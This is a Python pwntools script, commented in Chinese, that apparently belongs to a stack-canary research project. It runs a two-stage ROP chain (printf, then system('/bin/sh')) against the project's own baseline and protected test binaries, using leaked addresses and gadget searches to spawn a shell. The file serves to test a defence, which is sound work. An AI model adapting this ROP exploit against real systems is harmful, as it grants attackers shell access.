# Copyright 2026 DynamicCanaryProject Authors
#
# 文件名: exp_rop.py
# 功能描述: 高级 ROP 链攻击对比验证脚本。
#
#           针对 vuln_standard() 发起两段式 ROP 链攻击：
#             第一段：printf("/bin/sh")  —— 用于验证 ROP 链控制流可达。
#             第二段：system("/bin/sh") —— 用于实际弹出 Shell。
#           利用程序主动泄露的 system 地址与 sh_str 地址规避 ASLR，
#           并通过 pwntools 内置的汇编搜索定位 `pop rdi; ret` 和 `ret` Gadget。
#
#           预期结果：
#             - targets_baseline  : 两段 ROP 链依次执行，获得 Shell。
#             - targets_protected : Canary 被覆盖，拦截在函数返回前触发。
#
# 用法: python3 exp_rop.py          # 测试基线版本
#        python3 exp_rop.py prot     # 测试动态 Canary 保护版本
#
# 依赖工具: pwntools
# 作者: 陈文嘉
# 创建日期: 2026-04-15

from pwn import *
import sys, time

context.arch = 'amd64'
is_prot = len(sys.argv) > 1 and sys.argv[1] == 'prot'
target = '../output/targets_protected' if is_prot else '../output/targets_baseline'
print(f"================ 测试目标: {target} ================")

elf = ELF(target)
p = process([target, '1'])

p.recvuntil(b"system")
system_addr = int(p.recvline().strip().split()[-1], 16)
p.recvuntil(b"sh_str")
sh_addr = int(p.recvline().strip().split()[-1], 16)

pop_rdi_ret = elf.search(asm('pop rdi; ret')).__next__()
ret_gadget = elf.search(asm('ret')).__next__()
puts_plt = elf.plt['printf']

if is_prot:
    payload = b'A' * 100
else:
    # 构造高级 ROP 链：执行两次连续的函数调用！
    payload = b'A' * 40 
    payload += p64(ret_gadget) + p64(pop_rdi_ret) + p64(sh_addr) + p64(puts_plt)     # 1. printf("/bin/sh")
    payload += p64(ret_gadget) + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr)  # 2. system("/bin/sh")

p.recvuntil(b": ")
p.send(payload)
time.sleep(0.5)

try:
    p.sendline("echo '[☠️] 高级 ROP 链执行完毕！系统已沦陷！'".encode())
    print(p.recvall(timeout=1).decode('utf-8', 'ignore'))
except: pass
print(p.recvall(timeout=1).decode('utf-8', 'ignore'))